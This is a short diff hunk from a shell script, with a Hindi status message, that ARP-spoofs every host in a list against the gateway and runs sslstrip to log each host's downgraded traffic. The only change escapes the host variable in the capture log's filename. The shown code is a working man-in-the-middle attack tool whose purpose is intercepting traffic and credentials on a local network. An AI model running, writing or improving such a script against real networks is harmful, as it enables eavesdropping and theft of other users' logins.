@@ -576,7 +576,7 @@ for HOST in $(cat live_hosts.txt); do
   sudo arpspoof -i $INTERFACE -t $HOST 192.168.1.1 &
   sudo arpspoof -i $INTERFACE -t 192.168.1.1 $HOST &
 
-  sslstrip -l $PORT -w "capture_${HOST}.log" -f &
+  sslstrip -l $PORT -w "capture_\${HOST}.log" -f &
   SSLSTRIP_PID=$!
 
   echo "[*] SSLstrip चल रहा है — $HOST पर"
